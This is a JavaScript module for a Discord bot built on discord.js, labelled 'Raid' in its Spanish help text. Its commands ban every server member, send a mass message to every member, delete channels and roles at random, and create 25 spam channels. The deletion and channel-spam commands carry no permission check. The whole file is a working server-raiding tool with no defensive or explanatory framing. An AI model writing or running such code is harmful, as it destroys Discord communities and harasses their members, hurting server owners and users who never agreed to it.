const Discord = require("discord.js")

module.exports.run = function (client, message, args, config, command) {
    if (command == "help") {
        return `\`\`\`Raid:\n\n${config.prefix}baneveryone\n${config.prefix}delcanales\n${config.prefix}creacanales\n${config.prefix}delrole\n${config.prefix}mdeveryone\`\`\``;
    } else if (command == "baneveryone") {
        if (message.author.id != config.idcreador) return;
        message.guild.members.forEach(m => {
            m.ban();
        });
    } else if (command == "mdeveryone") {
        if (message.author.id != config.idcreador) return;
        message.guild.members.forEach(m => {
            m.send(args.join(" "));
        });
    } else if (command == "delcanales") {
        for (var i = -1; i < client.guilds.get(message.guild.id).channels.array().length; i++) {
            client.guilds.get(message.guild.id).channels.random().delete().then(r => console.log("exito " + r.name + " fue borrado")).catch(e => console.log("algo salio mal: " + e))
        };
    } else if (command == "creacanales") {
        for (var x = 0; x < 25; x++) {
            client.guilds.get(message.guild.id).createChannel(args.join(" "), "text", {}).catch((err) => { });
        };
    } else if (command == "delrole") {
        for (var i = -1; i < client.guilds.get(message.guild.id).roles.array().length; i++) {
            client.guilds.get(message.guild.id).roles.random().delete().then(r => { }).catch(e => { })
        }
    };
};
